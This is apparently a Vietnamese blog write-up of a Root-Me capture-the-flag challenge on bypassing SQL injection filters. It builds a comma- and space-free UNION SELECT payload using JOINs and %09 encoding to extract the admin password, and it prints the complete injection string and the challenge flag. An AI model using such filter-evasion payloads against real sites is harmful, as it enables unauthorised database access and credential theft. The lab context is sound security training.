---
template: overrides/blog.html
icon: material/plus-circle
title: SQL injection - Filter bypass
description: >
  
search:
  exclude: true
hide:
  - feedback

tags:
    - SQL Injection 
---

# __SQL injection - Filter bypass__

<span>
:octicons-calendar-24: May 05, 2023

</span>

---


## __Tài nguyên và link challenge__

Tài nguyên của challenge này tại [https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Filter-bypass](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Filter-bypass)

Link challenge này tại [:octicons-arrow-right-24: http://challenge01.root-me.org/web-serveur/ch33/][http://challenge01.root-me.org/web-serveur/ch33/]

  [http://challenge01.root-me.org/web-serveur/ch33/]: http://challenge01.root-me.org/web-serveur/ch33/

## __Tổng quan__

Trong challenge này, mục tiêu của ta là lấy password admin.

## __Kịch bản tấn công__
### Bước 1: Kiểm tra website

Challenge này cung cấp cho ta 2 website: 1 cho việc login tài khoản, 1 cho việc xem các account thành viên (trang Members)

Như thường lệ ta tiêm vào url xem lỗ hổng, nhưng bài này bị filter mất tiêu gùi :crying_cat_face: :crying_cat_face: :crying_cat_face:
<figure markdown>
  ![Image title](/rootme/web-server/sql-injection/images/sql-injection-filter-bypass-01.png#zoom)
  <figcaption>Hình ảnh mô tả kết quả tiêm payload vào url</figcaption>
</figure>

Nhưng chờ chút, f12 website ra ta thấy được hint về database.

<div class="result" markdown>

``` sql linenums="1"
// CREATE TABLE IF NOT EXISTS `membres` (
//   `id` int(1) NOT NULL AUTO_INCREMENT,
//   `username` VARCHAR(5) NOT NULL,
//   `pass` VARCHAR(20) NOT NULL,
//   `email` VARCHAR( 50 ) NOT NULL,
//   PRIMARY KEY (`id`)
// ) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=2 ;
```

</div>

Ta có bảng `membres` với 4 trường, ta cần khai thác ở trường username và password

### Bước 2: Xem xét filter của website

Theo những filter mà tôi biết gồm `or, and, ||, /**/, union, select, join, whitespace, like, =, %0a, %0b, %0c, ',comma(,),+,...` thì nó filter hết sạch :)

Quay trở lại phần hint về database, điều này giúp ta dễ dàng hơn trong việc bypass. Cụ thể ta cần lấy trường password. Oke payload ta sẽ có dạng `union select pass,1,1,1 FROM membres LIMIT 1`. Nhưng vấn đề đặt ra ở đây là website này đã filter "," nên ta sẽ thay nó bằng câu truy vấn khác và sau khi tìm hiểu google thì từ câu truy vấn trên ta có thể thay thế bằng cách dùng phép kết (JOIN).

- Ví dụ ta có: select 1,2,3 thì tương ứng với `select * from membres limit 1 ((select 1)A join (select 2)B join (select 3)C)`

Roài, bây giờ ta chuyển đổi thôi, câu lệnh mới thành: `union select * from ((select pass from membres limit 1)A join (select 1)B join (select 2)C join (select 3)D)`.

Tuy nhiên, website này filter `khoảng trắng` và filter kí tự thường nên ta dùng HTML URL-encoding[^1] thay thế thành `%90` đồng thời chỉnh lại các từ khóa thành kí tự in hoa, ta được `UNION%09SELECT%09*%09FROM%09((SELECT%09pass%09FROM%09membres%09LIMIT%091)A%09JOIN%09(SELECT%091)B%09JOIN%09(SELECT%091)C%09JOIN%09(SELECT%091)D)`

Tóm lại, payload đầy đủ của ta là `...id=-1%09UNION%09SELECT%09*%09FROM%09((SELECT%09pass%09FROM%09membres%09LIMIT%091)A%09JOIN%09(SELECT%091)B%09JOIN%09(SELECT%091)C%09JOIN%09(SELECT%091)D)`

<figure markdown>
  ![Image title](/rootme/web-server/sql-injection/images/sql-injection-filter-bypass-02.png#zoom)
  <figcaption>Hình ảnh mô tả kết quả tiêm payload vào url</figcaption>
</figure>

Roài, ta submit flag thôi nào

!!! success "__Flag__"
    KLfgyTIJbdhursqli

 [^1] Xem document tại https://www.eso.org/~ndelmott/url_encode.html